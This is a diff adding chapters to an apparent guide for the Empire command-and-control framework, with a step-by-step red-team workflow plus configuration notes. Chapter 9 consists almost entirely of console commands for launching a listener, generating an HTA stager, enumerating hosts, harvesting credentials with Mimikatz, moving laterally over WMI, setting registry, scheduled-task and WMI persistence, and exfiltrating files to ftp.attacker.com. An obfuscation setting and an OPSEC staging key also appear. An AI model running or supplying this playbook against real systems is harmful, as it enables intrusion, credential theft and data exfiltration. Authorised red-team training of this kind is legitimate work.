@@ -392,6 +392,116 @@ tail -f empire/logs/empire.log
 
 ---
 
+## Chapter 9: Real-World Scenarios
+
+### Full Red Team Engagement Workflow
+
+```bash
+# 1. Start HTTPS listener
+(Empire: listeners) > uselistener http
+(Empire: listeners/http) > set Host https://redirector.example.com
+(Empire: listeners/http) > set Port 443
+(Empire: listeners/http) > set CertPath /path/to/cert.pem
+(Empire: listeners/http) > execute
+
+# 2. Generate stager for initial access
+(Empire) > usestager windows/hta
+(Empire: stager/windows/hta) > set Listener http
+(Empire: stager/windows/hta) > generate
+
+# 3. Once agent connects, enumerate
+(Empire: agent) > shell whoami /all
+(Empire: agent) > shell systeminfo
+(Empire: agent) > usemodule powershell/situational_awareness/host/seatbelt
+(Empire: module/...) > set Agent <agent_name>
+(Empire: module/...) > execute
+
+# 4. Credential harvesting
+(Empire: agent) > usemodule powershell/credentials/mimikatz/logonpasswords
+(Empire: module/...) > execute
+
+# 5. Lateral movement
+(Empire: agent) > usemodule powershell/lateral_movement/invoke_wmiexec
+(Empire: module/...) > set ComputerName 10.0.0.50
+(Empire: module/...) > set Listener http
+(Empire: module/...) > execute
+```
+
+### Persistence Mechanisms
+
+```bash
+# Registry persistence
+(Empire: agent) > usemodule persistence/powerstyle/registry
+(Empire: module/...) > execute
+
+# Scheduled task persistence
+(Empire: agent) > usemodule persistence/powerstyle/schtasks
+(Empire: module/...) > execute
+
+# WMI event subscription
+(Empire: agent) > usemodule persistence/powerstyle/wmi
+(Empire: module/...) > execute
+```
+
+### Data Exfiltration
+
+```bash
+# Download files from target
+(Empire: agent) > download C:\Users\target\Documents\secrets.xlsx
+
+# Use exfil modules
+(Empire: agent) > usemodule exfil/powerstyle/ftp
+(Empire: module/...) > set FTPHost ftp.attacker.com
+(Empire: module/...) > set FTPUser exfil
+(Empire: module/...) > set FTPPass password
+(Empire: module/...) > execute
+```
+
+---
+
+## Chapter 10: Empire Configuration Deep Dive
+
+### Configuration File
+
+```yaml
+# empire/config/empire.yml
+---
+defaults:
+  database_type: sqlite
+  database_connection_string: "data/empire.db"
+  install_path: "/opt/Empire"
+  api_host: "127.0.0.1"
+  api_port: 1337
+  staging_key: "random_staging_key"
+  obfuscation: true
+  obfuscation_command: "Invoke-Obfuscation"
+  disable_logging: false
+```
+
+### Custom Staging Key
+
+```bash
+# Set a custom staging key for OPSEC
+./ps-empire server --staging-key MyCustomKey123
+
+# Use the same key when generating stagers
+(Empire: stager) > set StagingKey MyCustomKey123
+```
+
+### Database Migration
+
+```bash
+# Migrate from SQLite to PostgreSQL
+# 1. Update empire/config/empire.yml
+database_type: postgres
+database_connection_string: "postgresql://user:pass@localhost:5432/empire"
+
+# 2. Restart Empire
+./ps-empire server
+```
+
+---
+
 ## Resources
 
 - **GitHub Repository:** https://github.com/BC-SECURITY/Empire
@@ -400,4 +510,6 @@ tail -f empire/logs/empire.log
 - **Starkiller:** https://github.com/BC-SECURITY/Starkiller
 - **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
 - **MITRE ATT&CK - PowerShell:** https://attack.mitre.org/techniques/T1059/001/
+- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
+- **MITRE ATT&CK - Server Software Component:** https://attack.mitre.org/techniques/T1505/
 - **Related Tools:** Starkiller, Metasploit Framework, Cobalt Strike
